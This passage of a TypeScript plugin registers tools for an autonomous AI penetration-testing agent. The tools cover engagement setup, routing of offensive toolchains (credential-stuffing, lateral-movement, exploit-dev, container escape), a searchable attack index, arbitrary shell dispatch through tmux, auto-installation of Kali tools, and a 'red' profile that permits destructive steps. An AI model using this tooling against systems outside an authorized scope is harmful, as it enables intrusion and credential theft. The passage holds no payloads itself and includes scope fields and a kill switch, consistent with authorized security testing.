        (st.todos || []).length
          ? `todo plan (${(st.todos as Json[]).filter((t) => t.status === "open").length} open / ${(st.todos as Json[]).filter((t) => t.status === "doing").length} doing):\n${(st.todos as Json[])
              .map((t) => `  - [${t.status}] ${t.id}: ${t.text}`)
              .join("\n")}\n  → work the next "doing"/"open" item top-down; mark done with raptor_todo(action=set, id, status="done")`
          : null,
        stopRequested() ? `KILL-SWITCH ACTIVE: ~/.raptor/STOP is set — do not launch new heavy steps; finish recording and report only.` : null,
        `workspace: ${dir}`,
        `</raptor-state>`,
      ]
        .filter(Boolean)
        .join("\n")
      event.system.push({ type: "text", text: block })
    })

    /* register the tool namespace */
    await ctx.tool.transform((editor: Json) => {
      editor.namespace({
        name: "raptor",
        description:
          "Raptor engagement control plane: init an engagement, route tool chains, capture findings, audit the toolchain, build reports and diff recon.",
      })

      editor.add({
        name: "engage",
        description:
          "Start an autonomous engagement against a target. Creates the workspace, persistent state and memory pointer. Call this FIRST, before any other raptor tool.",
        input: {
          type: "object",
          properties: {
            target: { type: "string", description: "Host, URL, CIDR, repo path, or binary path to assess." },
            profile: {
              type: "string",
              enum: ["stealth", "friendly", "full", "red"],
              description: "stealth=noisy-free slow, friendly=PoC only non-destructive, full=complete chain proof-first, red=full chain with destructive steps allowed.",
            },
            objective: { type: "string", description: "What a successful engagement means for this target." },
            scope: { type: "array", items: { type: "string" }, description: "Explicitly in-scope hosts/IPs/CIDRs beyond the primary target." },
            notes: { type: "string", description: "Operator context: engagement ID, rules of engagement, credentials, timing constraints." },
          },
          required: ["target"],
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => ({ content: JSON.stringify(engage(input), null, 2) }),
      })

      editor.add({
        name: "route",
        description:
          "Tool-chain router. Given an intent, returns the ordered command chain, which binaries are present, install commands for missing ones and how to read the result. Renowned intents: subdomain-enum, port-scan, dir-enum, sqli, xss, ssrf, jwt-audit, credential-stuffing, linux-privesc, ad-enum, lateral-movement, re-static, re-dynamic, malware-triage, exploit-dev. Extended: cloud-posture-audit, cloud-aws-audit, cloud-azure-audit, cloud-gcp-audit, iam-privesc, cloud-secrets, imds-credential-hunt, iac-scan, container-vuln-scan, docker-audit, runtime-detection, k8s-hunt, k8s-cis-audit, k8s-manifest-audit, k8s-rbac-enum, k8s-escape, helm-audit, istio-audit, forensics-disk, forensics-memory, sleuthkit-analysis, autopsy-timeline, stego, metadata-audit, hash-identify, hash-crack, cipher-analysis, frequency-crack, rsa-analysis, subsiege, subdomain-takeover, param-spider, secret-hunt-git, osint-platform, shodan-recon, censys-recon, aquatone-survey, fuzz-binary, symbolic-exec.",
        input: {
          type: "object",
          properties: {
            intent: { type: "string", description: "Intent key, e.g. subdomain-enum, port-scan, dir-enum, file-ext-enum, api-map, vuln-scan, sqli, xss, ssrf, jwt-audit, credential-stuffing, linux-privesc, ad-enum, lateral-movement, re-static, re-dynamic, malware-triage, detection-artifacts, adversary-emulation, exploit-dev." },
            target: { type: "string", description: "Target for the chain (host, URL, CIDR, file path)." },
            vars: { type: "object", description: "Extra substitution values, e.g. {out: '/tmp/opencode/out', wordlist: '...'}" },
          },
          required: ["intent"],
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => {
          const dir = activeEngagementDir()
          const st = dir ? loadState(dir) : {}
          const target = input.target || st.target || ""
          return { content: JSON.stringify(route(input.intent || "", target, input.vars || {}), null, 2) }
        },
      })

      editor.add({
        name: "state",
        description:
          "Read or update the live engagement state: phase, hypotheses, decisions, discovered surface (hosts/endpoints/files/secrets), open questions. Update it every phase so the run survives compaction. Pass dir to target a specific workspace when more than one engagement runs concurrently.",
        input: {
          type: "object",
          properties: {
            set: { type: "object", description: "State keys to merge: phase, phases_done, hypotheses, decisions, open_questions, surface, notes." },
            add_hypothesis: { type: "string", description: "Append a hypothesis to test." },
            phase: { type: "string", description: "Set the current phase: plan|recon|surface|exploit|post|reverse|malware|report." },
            dir: { type: "string", description: "Explicit engagement workspace (multi-session safety). Omit to use the active engagement." },
          },
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => {
          const dir = input.dir ? resolve(String(input.dir)) : activeEngagementDir()
          if (!dir || !existsSync(dir)) return { content: JSON.stringify({ ok: false, error: "No active engagement. Call raptor_engage first (or pass an existing dir)." }) }
          const st = loadState(dir)
          if (input.phase) st.phase = input.phase
          if (input.set) {
            for (const [k, v] of Object.entries(input.set)) {
              if (k === "surface") st.surface = { ...(st.surface || {}), ...(v as Json) }
              else st[k] = v
            }
          }
          if (input.add_hypothesis) {
            st.hypotheses = st.hypotheses || []
            st.hypotheses.push({ hypothesis: input.add_hypothesis, at: nowISO(), status: "open" })
          }
          saveState(dir, st)
          return { content: JSON.stringify({ ok: true, workspace: dir, state: st }, null, 2) }
        },
      })

      editor.add({
        name: "finding",
        description:
          "Record a finding. Only call this for something you have actually proven (evidence + reproduction). Use confirmed=false for candidates.",
        input: {
          type: "object",
          properties: {
            title: { type: "string" },
            severity: { type: "string", enum: ["critical", "high", "medium", "low", "info"] },
            category: { type: "string", description: "e.g. sqli, rce, idor, auth-bypass, privesc, exposure, misconfig" },
            endpoint: { type: "string" },
            cvss: { type: "number" },
            cve: { type: "string" },
            evidence: { type: "string", description: "Exact request/response, command + output, hash, or decoded payload that proves it." },
            poc: { type: "string", description: "Reproduction steps an engineer can re-run." },
            impact: { type: "string" },
            fix: { type: "string" },
            confirmed: { type: "boolean", description: "false for unverified candidates." },
            dir: { type: "string", description: "Explicit engagement workspace (multi-session safety). Omit to use the active engagement." },
          },
          required: ["title", "severity"],
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => {
          const dir = input.dir ? resolve(String(input.dir)) : activeEngagementDir()
          if (!dir || !existsSync(dir)) return { content: JSON.stringify({ ok: false, error: "No active engagement. Call raptor_engage first (or pass an existing dir)." }) }
          return { content: JSON.stringify(addFinding(dir, input), null, 2) }
        },
      })

      editor.add({
        name: "doctor",
        description:
          "Audit the offensive toolchain: which binaries are present, which are missing, and the install plan. Pass install=true to actually install the missing ones (apt/pip/go/cargo/git).",
        input: {
          type: "object",
          properties: { install: { type: "boolean", description: "Install missing tools." } },
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => ({ content: JSON.stringify(doctor(!!input.install), null, 2) }),
      })

      editor.add({
        name: "attacks",
        description:
          "Search the MASTER ATTACK INDEX (1469 techniques across 26 categories + human/social/account families). Given the operator's requirement - in any language - returns the matching attack techniques, the reference file to load, the toolchain to route, and how to verify each one. Call this FIRST when the operator names a goal or an attack technique.",
        input: {
          type: "object",
          properties: {
            query: { type: "string", description: "The operator's requirement or attack name, e.g. 'wifi password', 'sql injection', 'domain admin', 'cloud bucket', 'phone spy'." },
            category: { type: "string", description: "Filter by category, e.g. 'Wireless', 'Active Directory', 'Malware'." },
            limit: { type: "number", description: "Max matches to return (default 20)." },
          },
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => ({ content: JSON.stringify(attackLookup(input.query || "", input.category || "", input.limit || 20), null, 2) }),
      })

      editor.add({
        name: "kali",
        description:
          "Search the full Kali offensive-tool inventory (hundreds of binaries + nmap scripts) by keyword, category or purpose. Use it whenever you need a tool that raptor_route does not have a curated chain for - it returns the exact binary name, its category and whether it is installed.",
        input: {
          type: "object",
          properties: {
            query: { type: "string", description: "Keyword: tool name, category (sqli, privesc, osint, wifi) or purpose (hash, fuzz, smb). Empty = show the category map." },
          },
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => ({ content: JSON.stringify(kaliSearch(input.query || ""), null, 2) }),
      })

      editor.add({
        name: "report",
        description: "Generate the evidence-backed engagement report from captured findings (report.md, and report.json when format=json).",
        input: {
          type: "object",
          properties: {
            format: { type: "string", enum: ["md", "json", "both"] },
            dir: { type: "string", description: "Explicit engagement workspace (multi-session safety). Omit to use the active engagement." },
          },
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => {
          const dir = input.dir ? resolve(String(input.dir)) : activeEngagementDir()
          if (!dir || !existsSync(dir)) return { content: JSON.stringify({ ok: false, error: "No active engagement. Call raptor_engage first (or pass an existing dir)." }) }
          const fmt = input.format === "json" ? "json" : input.format === "both" ? "both" : "md"
          return { content: JSON.stringify(buildReport(dir, fmt), null, 2) }
        },
      })

      editor.add({
        name: "diff",
        description:
          "Diff the currently recorded attack surface against the previous snapshot of this engagement, then snapshot the current state. Use it to detect new hosts/endpoints/secrets on re-runs.",
        input: {
          type: "object",
          properties: {
            dir: { type: "string", description: "Explicit engagement workspace (multi-session safety). Omit to use the active engagement." },
          },
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => {
          const dir = input.dir ? resolve(String(input.dir)) : activeEngagementDir()
          if (!dir || !existsSync(dir)) return { content: JSON.stringify({ ok: false, error: "No active engagement. Call raptor_engage first (or pass an existing dir)." }) }
          return { content: JSON.stringify(reconDiff(dir), null, 2) }
        },
      })

      editor.add({
        name: "note",
        description:
          "Write a durable cross-engagement memory note: a technique/chain that worked, a false lead to avoid, an intel lead. These are replayed in future runs.",
        input: {
          type: "object",
          properties: {
            kind: { type: "string", enum: ["chain", "finding", "intel", "trap"] },
            text: { type: "string" },
            tags: { type: "array", items: { type: "string" } },
          },
          required: ["text"],
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => {
          ensureDir(BASE)
          const line = `\n- [${input.kind || "note"}]${(input.tags || []).map((t: string) => `#${t}`).join("")} ${input.text}\n`
          appendFileSync(MEMORY, line)
          return { content: JSON.stringify({ ok: true, memory: MEMORY, appended: input.text }, null, 2) }
        },
      })

      editor.add({
        name: "todo",
        description:
          "Todo-driven execution plan for the current engagement. add the plan before working, then update statuses as you go (open → doing → done). The open board is injected into every future context so you always know your next step. Actions: add | set | list | clear.",
        input: {
          type: "object",
          properties: {
            action: { type: "string", enum: ["add", "set", "list", "clear"], description: "add: new item; set: change status/result of an id; list: full board; clear: wipe the board." },
            text: { type: "string", description: "Item text (action=add)." },
            id: { type: "string", description: "Todo id (action=set)." },
            status: { type: "string", enum: ["open", "doing", "done", "blocked", "dropped"], description: "Status (action=set)." },
            result: { type: "string", description: "One-line outcome to record when closing the item (action=set)." },
            dir: { type: "string", description: "Explicit engagement workspace (multi-session safety). Omit to use the active engagement." },
          },
          required: ["action"],
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => {
          const dir = input.dir ? resolve(String(input.dir)) : activeEngagementDir()
          if (!dir || !existsSync(dir)) return { content: JSON.stringify({ ok: false, error: "No active engagement. Call raptor_engage first (or pass an existing dir)." }) }
          if (input.action === "add" && !input.text)
            return { content: JSON.stringify({ ok: false, error: "action=add requires text" }) }
          if (input.action === "add") {
            // batch-add: text containing ' | ' creates multiple items at once
            const parts = String(input.text).split(" | ").map((s) => s.trim()).filter(Boolean)
            const added = (parts as string[]).map((p) => todoMutate(dir, "add", { text: p }))
            return { content: JSON.stringify({ ok: true, added: added.length, board: todoBoard(dir) }, null, 2) }
          }
          if (input.action === "set") return { content: JSON.stringify(todoMutate(dir, "set", input), null, 2) }
          return { content: JSON.stringify(input.action === "clear" ? todoMutate(dir, "clear") : todoBoard(dir), null, 2) }
        },
      })

      editor.add({
        name: "tmux",
        description:
          "tmux shell orchestrator: a session per engagement with dash/ops/logs windows. start a session, dispatch real shell commands into a window, capture output, list sessions, stop the tree. Use it for long-running tools so you keep working while the pane fills.",
        input: {
          type: "object",
          properties: {
            action: { type: "string", enum: ["start", "cmd", "capture", "list", "stop"], description: "start: create session; cmd: send a shell command; capture: read pane output; list: show sessions; stop: kill session tree." },
            target: { type: "string", description: "Target the session is named after (action=start)." },
            session: { type: "string", description: "Session name (default: raptor-<slug(target)>; action=cmd/capture/stop). Use '*' to stop every raptor session." },
            window: { type: "string", enum: ["ops", "dash", "logs"], description: "Window to send into / capture (default: ops)." },
            cmd: { type: "string", description: "Shell command to dispatch (action=cmd)." },
            lines: { type: "number", description: "Lines to capture (action=capture, default 120)." },
            dir: { type: "string", description: "Explicit engagement workspace (multi-session safety; action=start workdir). Omit to use the active engagement." },
          },
          required: ["action"],
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => {
          if (stopRequested() && input.action !== "list")
            return { content: JSON.stringify({ ok: false, error: "KILL-SWITCH ACTIVE (~/.raptor/STOP). Clear it with raptor_stop before resuming." }) }
          const dir = input.dir ? resolve(String(input.dir)) : activeEngagementDir()
          // consistent naming: engagement state target wins, input.target is fallback —
          // this keeps start/cmd/capture/stop on the same session name
          const implicit = dir ? loadState(dir).target : input.target
          const name = input.session || tmuxSessionName(implicit || input.target || "workspace")
          const win = input.window || "ops"
          switch (input.action) {
            case "start": {
              const workdir = dir || join(BASE, "sessions")
              ensureDir(workdir)
              return {
                content: JSON.stringify(
                  tmuxStart(name, workdir, [
                    { window: "dash", cmd: `echo "[raptor] ${name} — ops window: run tool commands here; logs window tails the run log"` },
                    { window: "ops", cmd: "echo '[raptor] ops'" },
                    { window: "logs", cmd: "true" },
                  ]),
                  null,
                  2,
                ),
              }
            }
            case "cmd": {
              if (!input.cmd) return { content: JSON.stringify({ ok: false, error: "action=cmd requires cmd" }) }
              ensureDir(BASE)
              try {
                appendFileSync(join(BASE, "run.log"), `[${nowISO()}] tmux:${name}:${win} ← ${input.cmd}\n`)
              } catch {}
              return { content: JSON.stringify(tmuxDispatch(name, win, input.cmd), null, 2) }
            }
            case "capture":
              return { content: JSON.stringify(tmuxCapture(name, win, Number(input.lines) || 120), null, 2) }
            case "list":
              return { content: JSON.stringify(tmuxList(), null, 2) }
            case "stop":
              return { content: JSON.stringify(tmuxStop(name), null, 2) }
            default:
              return { content: JSON.stringify({ ok: false, error: `unknown action ${input.action}` }) }
          }
        },
      })

      editor.add({
        name: "pattern",
        description:
          "Reusable attack-chain patterns. store a working chain keyed by a target fingerprint (stack, waf, service...) and re-play it on the next similar target. Actions: list | query | add | use.",
        input: {
          type: "object",
          properties: {
            action: { type: "string", enum: ["list", "query", "add", "use"] },
            query: { type: "string", description: "Search text against name/match/notes (action=query)." },
            name: { type: "string", description: "Pattern name (action=add)." },
            match: { type: "object", description: "Fingerprint keywords, e.g. {stack:'nginx|apache', waf:'cloudflare'} (action=add)." },
            chain: { type: "object", description: "The chain to re-play, e.g. {routes:['subsiege','fuzz-web','sqli'], notes:[...]} (action=add)." },
            verify: { type: "string", description: "How success was verified (action=add)." },
            id: { type: "string", description: "Pattern id instance (action=use marks used)." },
          },
          required: ["action"],
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => {
          const all = patternLoadAll()
          if (input.action === "list") return { content: JSON.stringify({ ok: true, count: all.length, patterns: all }, null, 2) }
          if (input.action === "query") {
            const q = String(input.query || "").toLowerCase()
            const hits = all.filter((p) => JSON.stringify(p).toLowerCase().includes(q))
            return { content: JSON.stringify({ ok: true, query: q, matched: hits.length, patterns: hits }, null, 2) }
          }
          if (input.action === "add") {
            if (!input.name || !input.chain) return { content: JSON.stringify({ ok: false, error: "action=add requires name + chain" }) }
            const saved = patternSave({
              name: input.name,
              match: input.match || {},
              chain: input.chain,
              verify: input.verify || "",
              notes: input.notes || [],
              times_used: 0,
            })
            return { content: JSON.stringify({ ok: true, saved }, null, 2) }
          }
          // use
          const p = all.find((x) => x.id === input.id)
          if (!p) return { content: JSON.stringify({ ok: false, error: `pattern '${input.id}' not found` }) }
          p.times_used = (p.times_used || 0) + 1
          p.last_used = nowISO()
          patternSave(p)
          return { content: JSON.stringify({ ok: true, pattern: p }, null, 2) }
        },
      })

      editor.add({
        name: "stop",
        description:
          "Kill switch. action=stop: set ~/.raptor/STOP, interrupt and kill every raptor tmux session tree — all loops halt. action=resume: clear the flag. Context injection warns you while the flag is live.",
        input: {
          type: "object",
          properties: {
            action: { type: "string", enum: ["stop", "resume"], description: "stop: halt everything; resume: clear the flag." },
            reason: { type: "string", description: "Why the stop was requested (action=stop)." },
          },
          required: ["action"],
          additionalProperties: false,
        },
        options: { namespace: "raptor", codemode: true },
        execute: async (input: Json) => ({
          content: JSON.stringify(input.action === "stop" ? requestStop(input.reason || "operator requested stop") : clearStop(), null, 2),
        }),
      })
    })

    return () => {}
  },
}
